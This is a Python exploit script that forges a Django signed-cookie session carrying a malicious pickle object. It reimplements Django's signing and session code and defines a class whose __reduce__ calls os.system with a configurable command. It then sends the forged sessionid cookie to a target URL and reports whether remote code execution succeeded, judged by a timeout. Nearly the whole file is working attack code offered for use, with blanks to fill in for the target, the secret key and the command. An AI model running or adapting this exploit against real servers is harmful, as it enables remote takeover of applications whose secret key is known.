import datetime
from decimal import Decimal
import hashlib
import hmac
import base64
import zlib
import secrets
import pickle
import warnings
import time
import logging
import os
import requests

# CUSTOMIZE ------------------------------------------------------------------------------------------------------------
URL = ''
SECRET_KEY = ''
CMD = 'sleep 5'
# CUSTOMIZE ------------------------------------------------------------------------------------------------------------

SECRET_KEY_FALLBACKS = ''

_PROTECTED_TYPES = (
    type(None),
    int,
    float,
    Decimal,
    datetime.datetime,
    datetime.date,
    datetime.time,
)
BASE62_ALPHABET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"


class SessionBase:
    """
    Base class for all Session classes.
    """

    __not_given = object()

    def __init__(self, session_key=None):
        self._session_key = session_key
        self.accessed = False
        self.modified = False
        self.serializer = PickleSerializer

    def encode(self, session_dict):
        "Return the given session dictionary serialized and encoded as a string."
        return dumps(
            session_dict,
            salt='django.contrib.sessions.backends.signed_cookies',
            serializer=self.serializer,
            compress=True,
        )

    def decode(self, session_data):
        try:
            return loads(
                session_data, salt='django.contrib.sessions.backends.signed_cookies', serializer=self.serializer
            )
        except BadSignature:
            logger = logging.getLogger("django.security.SuspiciousSession")
            logger.warning("Session data corrupted")
        except Exception:
            # ValueError, unpickling exceptions. If any of these happen, just
            # return an empty dictionary (an empty session).
            pass
        return {}


def is_protected_type(obj):
    """Determine if the object instance is of a protected type.

    Objects of protected types are preserved as-is when passed to
    force_str(strings_only=True).
    """
    return isinstance(obj, _PROTECTED_TYPES)


def force_bytes(s, encoding="utf-8", strings_only=False, errors="strict"):
    """
    Similar to smart_bytes, except that lazy instances are resolved to
    strings, rather than kept as lazy objects.

    If strings_only is True, don't convert (some) non-string-like objects.
    """
    # Handle the common case first for performance reasons.
    if isinstance(s, bytes):
        if encoding == "utf-8":
            return s
        else:
            return s.decode("utf-8", errors).encode(encoding, errors)
    if strings_only and is_protected_type(s):
        return s
    if isinstance(s, memoryview):
        return bytes(s)
    return str(s).encode(encoding, errors)


class InvalidAlgorithm(ValueError):
    """Algorithm is not supported by hashlib."""

    pass


def salted_hmac(key_salt, value, secret=None, *, algorithm="sha1"):

    key_salt = force_bytes(key_salt)
    secret = force_bytes(secret)
    try:
        hasher = getattr(hashlib, algorithm)
    except AttributeError as e:
        raise InvalidAlgorithm(
            "%r is not an algorithm accepted by the hashlib module." % algorithm
        ) from e
    key = hasher(key_salt + secret).digest()
    return hmac.new(key, msg=force_bytes(value), digestmod=hasher)


def b62_encode(s):
    if s == 0:
        return "0"
    sign = "-" if s < 0 else ""
    s = abs(s)
    encoded = ""
    while s > 0:
        s, remainder = divmod(s, 62)
        encoded = BASE62_ALPHABET[remainder] + encoded
    return sign + encoded


def b62_decode(s):
    if s == "0":
        return 0
    sign = 1
    if s[0] == "-":
        s = s[1:]
        sign = -1
    decoded = 0
    for digit in s:
        decoded = decoded * 62 + BASE62_ALPHABET.index(digit)
    return sign * decoded


def b64_encode(s):
    return base64.urlsafe_b64encode(s).strip(b"=")


def b64_decode(s):
    pad = b"=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def base64_hmac(salt, value, key, algorithm="sha1"):
    return b64_encode(
        salted_hmac(salt, value, key, algorithm=algorithm).digest()
    ).decode()


class BadSignature(Exception):
    """Signature does not match."""

    pass


class RemovedInDjango50Warning(PendingDeprecationWarning):
    pass


class PickleSerializer:
    """
    Simple wrapper around pickle to be used in signing.dumps()/loads() and
    cache backends.
    """

    def __init__(self, protocol=None):
        warnings.warn(
            "PickleSerializer is deprecated due to its security risk. Use "
            "JSONSerializer instead.",
            RemovedInDjango50Warning,
        )
        self.protocol = pickle.HIGHEST_PROTOCOL if protocol is None else protocol

    def dumps(self, obj):
        return pickle.dumps(obj, self.protocol)

    def loads(self, data):
        return pickle.loads(data)



def dumps(
    obj, key=None, salt="django.core.signing", serializer=PickleSerializer, compress=False
):
    """
    Return URL-safe, hmac signed base64 compressed JSON string. If key is
    None, use settings.SECRET_KEY instead. The hmac algorithm is the default
    Signer algorithm.

    If compress is True (not the default), check if compressing using zlib can
    save some space. Prepend a '.' to signify compression. This is included
    in the signature, to protect against zip bombs.

    Salt can be used to namespace the hash, so that a signed string is
    only valid for a given namespace. Leaving this at the default
    value or re-using a salt value across different parts of your
    application without good cause is a security risk.

    The serializer is expected to return a bytestring.
    """
    return TimestampSigner(key, salt=salt).sign_object(
        obj, serializer=serializer, compress=compress
    )


def loads(
    s,
    key=None,
    salt="django.core.signing",
    serializer=PickleSerializer,
    max_age=None,
    fallback_keys=None,
):
    """
    Reverse of dumps(), raise BadSignature if signature fails.

    The serializer is expected to accept a bytestring.
    """
    return TimestampSigner(key, salt=salt, fallback_keys=fallback_keys).unsign_object(
        s,
        serializer=serializer,
        max_age=max_age,
    )


class SignatureExpired(BadSignature):
    """Signature timestamp is older than required max_age."""

    pass


def constant_time_compare(val1, val2):
    """Return True if the two strings are equal, False otherwise."""
    return secrets.compare_digest(force_bytes(val1), force_bytes(val2))


class Signer:
    def __init__(
        self,
        key=None,
        sep=":",
        salt=None,
        algorithm=None,
        fallback_keys=None,
    ):
        self.key = key or SECRET_KEY
        self.fallback_keys = (
            fallback_keys
            if fallback_keys is not None
            else SECRET_KEY_FALLBACKS
        )
        self.sep = sep
        self.salt = salt or "%s.%s" % (
            self.__class__.__module__,
            self.__class__.__name__,
        )
        self.algorithm = algorithm or "sha256"

    def signature(self, value, key=None):
        key = key or self.key
        return base64_hmac(self.salt + "signer", value, key, algorithm=self.algorithm)

    def sign(self, value):
        return "%s%s%s" % (value, self.sep, self.signature(value))

    def unsign(self, signed_value):
        if self.sep not in signed_value:
            raise BadSignature('No "%s" found in value' % self.sep)
        value, sig = signed_value.rsplit(self.sep, 1)
        for key in [self.key, *self.fallback_keys]:
            if constant_time_compare(sig, self.signature(value, key)):
                return value
        raise BadSignature('Signature "%s" does not match' % sig)

    def sign_object(self, obj, serializer=PickleSerializer, compress=False):
        """
        Return URL-safe, hmac signed base64 compressed JSON string.

        If compress is True (not the default), check if compressing using zlib
        can save some space. Prepend a '.' to signify compression. This is
        included in the signature, to protect against zip bombs.

        The serializer is expected to return a bytestring.
        """
        data = serializer().dumps(obj)
        # Flag for if it's been compressed or not.
        is_compressed = False

        if compress:
            # Avoid zlib dependency unless compress is being used.
            compressed = zlib.compress(data)
            if len(compressed) < (len(data) - 1):
                data = compressed
                is_compressed = True
        base64d = b64_encode(data).decode()
        if is_compressed:
            base64d = "." + base64d
        return self.sign(base64d)

    def unsign_object(self, signed_obj, serializer=PickleSerializer, **kwargs):
        # Signer.unsign() returns str but base64 and zlib compression operate
        # on bytes.
        base64d = self.unsign(signed_obj, **kwargs).encode()
        decompress = base64d[:1] == b"."
        if decompress:
            # It's compressed; uncompress it first.
            base64d = base64d[1:]
        data = b64_decode(base64d)
        if decompress:
            data = zlib.decompress(data)
        return serializer().loads(data)


class TimestampSigner(Signer):
    def timestamp(self):
        return b62_encode(int(time.time()))

    def sign(self, value):
        value = "%s%s%s" % (value, self.sep, self.timestamp())
        return super().sign(value)

    def unsign(self, value, max_age=None):
        """
        Retrieve original value and check it wasn't signed more
        than max_age seconds ago.
        """
        result = super().unsign(value)
        value, timestamp = result.rsplit(self.sep, 1)
        timestamp = b62_decode(timestamp)
        if max_age is not None:
            if isinstance(max_age, datetime.timedelta):
                max_age = max_age.total_seconds()
            # Check timestamp is not older than max_age
            age = time.time() - timestamp
            if age > max_age:
                raise SignatureExpired("Signature age %s > %s seconds" % (age, max_age))
        return value


class RCE:
    def __reduce__(self):
        return os.system, (CMD,)


def decode(cookie):
    cookie = ''
    session_store = SessionBase()
    decoded = session_store.decode(cookie)
    print('[+] ' + str(decoded))


def main():
    print('[-] Start forging cookie...')
    data = {'rce': RCE()}
    session_store = SessionBase()
    encoded = session_store.encode(data)
    print('[+] Forged cookie : ' + encoded)

    try:
        print('[-] Sending request...')
        print('[-] ' + requests.get(URL, cookies={'sessionid': encoded}, timeout=3).text)
        print('[!] RCE failed if you tried a sleep')
    except requests.exceptions.Timeout:
        print('[+] RCE successfully triggered')
    except Exception as e:
        print('[!] Could not connect to server. Aborting.\n' + str(e))

# decode('')
main()
